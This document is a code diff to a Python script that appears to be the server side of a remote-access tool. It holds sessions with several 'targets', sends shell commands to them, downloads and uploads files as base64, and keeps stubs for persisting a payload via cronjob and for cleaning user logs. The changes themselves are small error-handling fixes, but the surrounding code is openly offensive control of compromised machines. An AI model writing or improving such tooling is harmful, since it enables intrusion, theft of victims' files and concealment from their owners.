@@ -5,21 +5,29 @@ import base64
 import datetime
 import os
 
+
 def basedir():
-    try:
-        os.mkdir(base_dir)
-    except OSError:
-        print("Error: Could not create %s directory" % base_dir)
+    if not os.path.exists(base_dir):
+        try:
+            os.mkdir(base_dir)
+        except OSError:
+            print("Error: Could not create %s directory" % base_dir)
+        else:
+            print("Alert: Successful created the directory %s" % base_dir)
     else:
-        print("Alert: Succesful created the directory %s " % base_dir)
+        print("Directory already exists!")
+
 
 def shell(target, ip):
     """Managing the shell commands. This function contains 2 additional functions called send and receive"""
 
     def send(data):
         """Responsible for sending data"""
-        json_data = json.dumps(data)
-        target.send(json_data)
+        try:
+            json_data = json.dumps(data)
+            target.send(json_data)
+        except ValueError:
+            pass
 
     def receive():
         """Responsible for receiving data"""
@@ -55,13 +63,12 @@ def shell(target, ip):
                 file.write(base64.b64decode(file_data))
                 print ("File was successfully downloaded at %s " % location)
 
-
         elif command_input[:6] == "upload":  # upload file. will be using b64
             with open(command_input[7:], "rb") as uload:
                 send(base64.b64encode(uload.read()))
 
         elif command_input == "persist":  # will attempt to persist payload via cronjob or service
-            pass
+            continue
 
         elif command_input == "clean":  # will attempt to clean all user logs (Probably will not get everything)
             pass
@@ -98,6 +105,7 @@ def server():
         except:
             pass
 
+
 if __name__ == "__main__":
     global s
     base_dir = "/var/entangle"
@@ -132,7 +140,7 @@ if __name__ == "__main__":
                 target_number = targets[num]
                 target_ip = ips[num]
                 shell(target_number, target_ip)
-            except:
+            except IndexError:
                 print("Session not %s Found!" % num)
                 continue
         elif command == "exit":  # Close server
